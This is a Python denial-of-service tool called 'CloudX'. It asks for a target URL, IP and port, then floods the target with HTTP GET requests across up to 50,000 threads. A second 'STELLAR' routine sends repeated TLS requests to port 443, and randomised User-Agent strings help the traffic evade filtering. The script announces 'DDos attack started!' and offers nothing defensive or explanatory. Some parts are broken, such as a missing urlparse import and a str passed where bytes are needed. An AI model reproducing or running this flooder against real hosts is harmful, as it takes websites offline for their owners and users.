import threading
import socket
import sys
import ssl
import socket
import urllib.request
import urllib.error
import random
import time

print("POST Method is currently being fixed and it is error right now, please use GET instead.")
logo="""
< =============== >
      CloudX
^ <=============> ^

"""
print(logo)

# Variables
url = ""
ip = ""
port = ""
threads = ""
method = ""
maxThreads = int(50000)

url_stellar = input("[+] Enter a URL for STELLAR attack: ")
timer_stellar = input("[+] Enter the attack timer for STELLAR (in seconds): ")
threads_stellar = input("[+] Enter the number of threads for STELLAR: ")

url = input("[+] Enter a URL to attack: ")
ip = input("[+] Enter the target IP address: ")
port = input("[+] Enter the target port (default: 80): ")
numberOfThreads = input("[+] Enter the desired number of threads (default: 16500): ")
method = input("[+] Enter either 'GET' or 'POST' as the request method (default: GET): ")

if port == "":
    port = str(80)
if numberOfThreads == "":
    numberOfThreads = int(16500)
if maxThreads < int(numberOfThreads):
    numberOfThreads = int(maxThreads)
if method == "":
    method = "GET"

# Construct attack parameters
headers = {
'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
'Connection': 'close'
}

USER_AGENT_PARTS = {
    'os': {
        'linux': {
            'name': ['Linux x86_64', 'Linux i386'],
            'ext': ['X11']
        },
        'windows': {
            'name': ['Windows NT 6.1', 'Windows NT 6.3', 'Windows NT 5.1', 'Windows NT.6.2'],
            'ext': ['WOW64', 'Win64; x64']
        },
        'mac': {
            'name': ['Macintosh'],
            'ext': ['Intel Mac OS X %d_%d_%d' % (random.randint(10, 11), random.randint(0, 9), random.randint(0, 5)) for i in range(1, 10)]
        },
    },
    'platform': {
        'webkit': {
            'name': ['AppleWebKit/%d.%d' % (random.randint(535, 537), random.randint(1,36)) for i in range(1, 30)],
            'details': ['KHTML, like Gecko'],
            'extensions': ['Chrome/%d.0.%d.%d Safari/%d.%d' % (random.randint(6, 32), random.randint(100, 2000), random.randint(0, 100), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 30) ] + [ 'Version/%d.%d.%d Safari/%d.%d' % (random.randint(4, 6), random.randint(0, 1), random.randint(0, 9), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 10)]
        },
        'iexplorer': {
            'browser_info': {
                'name': ['MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0'],
                'ext_pre': ['compatible', 'Windows; U'],
                'ext_post': ['Trident/%d.0' % i for i in range(4, 6) ] + [ '.NET CLR %d.%d.%d' % (random.randint(1, 3), random.randint(0, 5), random.randint(1000, 30000)) for i in range(1, 10)]
            }
        },
        'gecko': {
            'name': ['Gecko/%d%02d%02d Firefox/%d.0' % (random.randint(2001, 2010), random.randint(1,31), random.randint(1,12) , random.randint(10, 25)) for i in range(1, 30)],
            'details': [],
            'extensions': []
        }
    }
}

def attack(ip, port, threadNum):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    request = urllib.request.Request(url, None, headers)
    while True:
        try:
            if method  == "GET":
                urlsocket_file = urllib.request.urlopen(request)
                print("[*] Thread (%s) | Attack Sent!" % (threadNum))
            else:
                s.connect((ip, int(port)))
                s.sendto(("GET /%s HTTP/1.1\r\n" % (url)).encode('utf-8'), (ip, int(port)))
                s.sendto("Host: %s\r\n\r\n" % (url), (ip, int(port)))
                s.close()
                print("[*] Thread (%s) | Attack Sent!" % (threadNum))
        except urllib.error.URLError as e:
            print("[*] Thread (%s) | Error! seems like CloudX can't reach the target url!" % (threadNum))
            print("[*] Thread (%s) | Attack stopped." % (threadNum))
            break
for i in range(int(numberOfThreads)):
    threading.Thread(target=attack, args=(ip,port,i)).start()
    if i >=  48999:
        sys.exit()

print("[+] DDos attack started! Enjoy your 'boom' responsibly! ðŸ’£ðŸ”¥")
time.sleep(0.10)

def flood_url():
    while True:
        user_agent = ' '.join([random.choice(v['name']) for k, v in USER_AGENT_PARTS['os'].items()])
        user_agent += ' ('
        user_agent += ' '.join([random.choice(v['name']) for k, v in USER_AGENT_PARTS['platform'].items()])
        user_agent += ' '
        user_agent += ' '.join([random.choice(v) for k, v in USER_AGENT_PARTS['platform']['webkit'].items()])
        user_agent += ')'
        headers['User-Agent'] = user_agent
        request = urllib.request.Request(url, None, headers)
        urllib.request.urlopen(request)

def attackSTELLAR(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchSTELLAR, args=(url, timer)).start()

def LaunchSTELLAR(url, timer):
    timelol = time.time() + int(timer)
    req = "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += "User-Agent: " + random.choice(USER_AGENT_PARTS['platform']['webkit']['name']) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(urlparse(url).netloc), int(443)))
            ctx = ssl.create_default_context()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            try:
                for _ in range(100):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()

# GASS MANG
threading.Thread(target=flood_url).start()
attackSTELLAR(url_stellar, timer_stellar, threads_stellar)
